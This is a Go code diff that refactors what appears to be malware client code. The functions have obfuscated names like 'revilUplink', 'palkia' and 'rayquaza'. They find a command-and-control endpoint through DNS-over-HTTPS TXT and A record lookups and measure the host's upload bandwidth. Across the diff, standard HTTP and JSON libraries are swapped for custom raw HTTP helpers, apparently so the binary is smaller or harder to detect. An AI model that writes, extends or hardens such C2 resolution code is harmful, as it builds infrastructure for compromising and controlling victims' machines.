@@ -5,11 +5,9 @@ import (
 	"crypto/md5"
 	"crypto/tls"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"math/rand"
 	"net"
-	"net/http"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -149,40 +147,16 @@ func revilUplinkCached() float64 {
 // Uses a 100KB test file from a CDN for quick measurement.
 // Returns: Speed in Mbps (float64), 0.0 on error
 func revilUplink() float64 {
-	// Small test URLs (fast CDNs)
 	testURLs := []string{
 		speedTestURL,
 	}
 
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-
-	for _, url := range testURLs {
-		start := time.Now()
-		resp, err := client.Get(url)
+	for _, u := range testURLs {
+		totalBytes, elapsed, err := rawHTTPGetStream(u, 10*time.Second)
 		if err != nil {
 			continue
 		}
-
-		// Read all the data
-		var totalBytes int64
-		buf := make([]byte, 32*1024)
-		for {
-			n, err := resp.Body.Read(buf)
-			totalBytes += int64(n)
-			if err != nil {
-				break
-			}
-		}
-		resp.Body.Close()
-
-		elapsed := time.Since(start).Seconds()
 		if elapsed > 0 && totalBytes > 0 {
-			// Convert bytes/sec to Mbps (megabits per second)
 			mbps := (float64(totalBytes) * 8.0) / (elapsed * 1000000.0)
 			deoxys("revilUplink: Downloaded %d bytes in %.2fs = %.2f Mbps", totalBytes, elapsed, mbps)
 			return mbps
@@ -369,40 +343,20 @@ func palkia(domain string) (string, error) {
 	for _, server := range servers {
 		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
 		deoxys("palkia: Trying DoH server: %s", dohURL)
-		req, err := http.NewRequest("GET", dohURL, nil)
-		if err != nil {
-			deoxys("palkia: Request create error: %v", err)
-			continue
-		}
-		req.Header.Set("Accept", dnsJsonAccept)
-		client := &http.Client{Timeout: 10 * time.Second}
-		resp, err := client.Do(req)
+		hdrs := map[string]string{"Accept": dnsJsonAccept}
+		code, body, err := rawHTTPGet(dohURL, hdrs, 10*time.Second)
 		if err != nil {
 			deoxys("palkia: Request error: %v", err)
 			continue
 		}
-		deoxys("palkia: Got response status: %d", resp.StatusCode)
-		if resp.StatusCode != http.StatusOK {
-			resp.Body.Close()
+		deoxys("palkia: Got response status: %d", code)
+		if code != 200 {
 			continue
 		}
-		var dnsResp struct {
-			Status int `json:"Status"`
-			Answer []struct {
-				Type int    `json:"type"`
-				Data string `json:"data"`
-			} `json:"Answer"`
-		}
-		decodeErr := json.NewDecoder(resp.Body).Decode(&dnsResp)
-		resp.Body.Close()
-		if decodeErr != nil {
-			deoxys("palkia: JSON decode error: %v", decodeErr)
-			continue
-		}
-		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
-		for _, ans := range dnsResp.Answer {
+		answers := parseDoHAnswers(string(body))
+		deoxys("palkia: answers=%d", len(answers))
+		for _, ans := range answers {
 			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
-			// TXT records are type 16
 			if ans.Type != 16 {
 				continue
 			}
@@ -426,7 +380,6 @@ func palkia(domain string) (string, error) {
 					return data, nil
 				}
 			}
-			// Try plain IP address (no port) - append default 443
 			if net.ParseIP(data) != nil {
 				result := data + ":443"
 				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
@@ -457,37 +410,20 @@ func rayquaza(domain string) (string, error) {
 
 	// Fallback to DoH A record
 	servers := dohFallback
+	hdrs := map[string]string{"Accept": dnsJsonAccept}
 	for _, server := range servers {
 		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
 		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
-		req, err := http.NewRequest("GET", dohURL, nil)
-		if err != nil {
-			continue
-		}
-		req.Header.Set("Accept", dnsJsonAccept)
-		client := &http.Client{Timeout: 10 * time.Second}
-		resp, err := client.Do(req)
+		code, body, err := rawHTTPGet(dohURL, hdrs, 10*time.Second)
 		if err != nil {
 			deoxys("rayquaza: DoH error: %v", err)
 			continue
 		}
-		if resp.StatusCode != http.StatusOK {
-			resp.Body.Close()
+		if code != 200 {
 			continue
 		}
-		var dnsResp struct {
-			Answer []struct {
-				Type int    `json:"type"`
-				Data string `json:"data"`
-			} `json:"Answer"`
-		}
-		decodeErr := json.NewDecoder(resp.Body).Decode(&dnsResp)
-		resp.Body.Close()
-		if decodeErr != nil {
-			continue
-		}
-		for _, ans := range dnsResp.Answer {
-			// A records are type 1
+		answers := parseDoHAnswers(string(body))
+		for _, ans := range answers {
 			if ans.Type == 1 {
 				deoxys("rayquaza: Found A record: %s", ans.Data)
 				return ans.Data, nil
